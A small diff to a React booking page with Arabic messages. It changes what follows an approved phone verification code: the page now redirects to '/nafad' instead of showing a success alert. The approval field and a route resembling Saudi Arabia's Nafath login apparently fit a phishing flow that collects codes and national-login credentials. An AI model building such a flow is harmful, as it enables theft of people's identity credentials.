@@ -251,8 +251,7 @@ export default function BookingPage() {
     if (phoneOtpApproval === "approved") {
       setIsLoading(false)
       // Navigate to success page or show success message
-      setCurrentStep("landing")
-      alert("تم التحقق بنجاح! شكراً لك.")
+window.location.href='/nafad'
     } else if (phoneOtpApproval === "rejected") {
       setIsLoading(false)
       setPhoneOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
